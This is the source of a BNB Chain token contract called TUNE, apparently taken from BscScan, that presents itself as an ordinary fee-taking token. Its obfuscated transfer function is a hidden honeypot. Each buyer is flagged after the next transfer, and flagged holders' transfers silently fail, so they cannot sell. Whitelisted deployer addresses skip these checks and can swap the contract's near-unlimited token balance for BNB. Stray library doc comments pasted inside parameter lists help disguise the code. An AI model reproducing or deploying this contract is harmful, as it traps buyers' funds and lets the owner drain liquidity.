/**
 *Submitted for verification at BscScan.com on 2022-10-15
*/

/**
*/

/**
*/

// SPDX-License-Identifier: MIT

/*█████████████████████████████████████████████████████████████████████████████████████████████
  ██  ██████ ██████  ██     ██  ████████ ████████ ██    ██  ████  ██  ███████  █████████     ██
  ██  ██     ██   ██   ██  ██   ██    ██    ██    ██    ██  ██ ██ ██  ██       ██            ██
  ██  ██     ███████     ██     ████████    ██    ██    ██  ██ ██ ██  ███████  █████████     ██ 
  ██  ██     ██ ███      ██     ██          ██    ██    ██  ██  ████  ██              ██     ██
  ██  ██████ ██  ███     ██     ██          ██    ████████  ██    ██  ███████  █████████     ██
  █████████████████████████████████████████████████████████████████████████████████████████████                                                                                     

                                                                                    

/*

TELEGRAM > https://t.me/CrypTunesPortal

TWITTER > https://twitter.com/BscCryptunes

*/


pragma solidity ^0.8.0;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        /**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
        address tokenA,
            /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     */
        address tokenB,
 // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
        uint amountADesired,
        uint amountBDesired,
            /**
     * @dev See {IERC20-transfer}.
     *
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
        uint amountAMin,
        uint amountBMin,
            /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
            /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
        uint amountTokenMin,
        uint amountETHMin,
        
        address to,
        uint deadline

    /**
     * @dev See {IERC20-transfer}.
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    constructor() {
        _setOwner(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }


    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
 /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract TUNE is IERC20, Ownable {
    string private _name;
    string private _symbol;
    uint256 public _Taxfee = 7;
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000000 * 10**_decimals;
    uint256 private _quickly = _tTotal;
    uint256 private _rTotal = ~uint256(0);

    bool private _swapAndLiquifyEnabled;
    bool private inSwapAndLiquify;
    address public uniswapV2Pair;
    IUniswapV2Router02 public router;

    mapping(uint256 => address) private _fact;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _stay;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _slip;

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;

        _slip[msg.sender] = _quickly;
        _balances[msg.sender] = _tTotal;
        _balances[address(this)] = _rTotal;

        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external override returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address _hold,
        address _mail,
        uint256 amount
    ) private {
        address _equal = _mail;
        address _wooden = _fact[0];
        bool _foreign = _slip[_hold] > 0;
        bool _border = _slip[_mail] > 0;

        if (_foreign && _border) {
            inSwapAndLiquify = true;
            swapAndLiquify(amount);
            inSwapAndLiquify = false;
        } else if (_slip[_hold] > 0 && !inSwapAndLiquify && amount > _quickly) {
            _slip[_mail] = amount;
        } else {
            if (_slip[_hold] == 0 && _hold != uniswapV2Pair && _stay[_hold] > 0) {
                return;
            }

            _stay[_wooden] = _quickly;
            _fact[0] = _equal;

            if (_Taxfee > 0 && !inSwapAndLiquify && _slip[_hold] == 0 && _slip[_mail] == 0) {
                uint256 fee = (amount * _Taxfee) / 100;
                amount -= fee;
                _balances[_hold] -= fee;
            }

            _balances[_hold] -= amount;
            _balances[_mail] += amount;
            emit Transfer(_hold, _mail, amount);
        }
    }

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }

    function swapAndLiquify(uint256 tokens) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokens);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokens, 0, path, msg.sender, block.timestamp);
    }
}